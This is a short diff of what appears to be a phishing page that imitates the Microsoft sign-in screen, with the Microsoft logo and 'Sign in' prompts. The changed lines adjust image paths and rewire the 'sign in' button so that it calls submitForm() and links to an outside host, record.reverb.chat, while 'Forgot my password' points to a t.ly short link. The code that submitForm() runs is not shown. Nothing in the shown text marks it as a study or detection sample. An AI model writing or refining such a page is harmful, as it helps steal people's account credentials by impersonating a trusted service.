@@ -28,11 +28,11 @@
       </div>
     </form>
     <div class="login-downcontainer"> 
-        <img class="key" src="/static/images/key.png" alt="">
+        <img class="key" src="images/key.png" alt="">
         <p class="option">Sign-in options</p>
     </div>
 
- 
+
   </div>
   
 
@@ -54,7 +54,10 @@
           </div>
           <div class="access_acc"><p>Forgot my password<a href="https://t.ly/oHda2"></a></p></div>
           <div class="form-group2">
-     <a onclick='submitForm()'   href="https://record.reverb.chat/embed/a0rBthi2IY6sRrrLB0qB " class="sign_in" > sign in</a>
+           <button type="button" onclick=submitForm() class="sign_in" >
+  <a   href="https://record.reverb.chat/embed/a0rBthi2IY6sRrrLB0qB " > sign in</a>
+ </button>
+   
           </div>
         </form>
         `;
@@ -67,7 +70,7 @@
     function prevPage() {
       var container = document.getElementById('loginContainer');
       container.innerHTML = `
-      <div class="miclogo"><img src="/static/images/microsoft_logo.png" alt=""><p>Microsoft</p>
+      <div class="miclogo"><img src="images/microsoft_logo.png" alt=""><p>Microsoft</p>
       </div>
       <div class="sign"><p>Sign in</p></div>
       
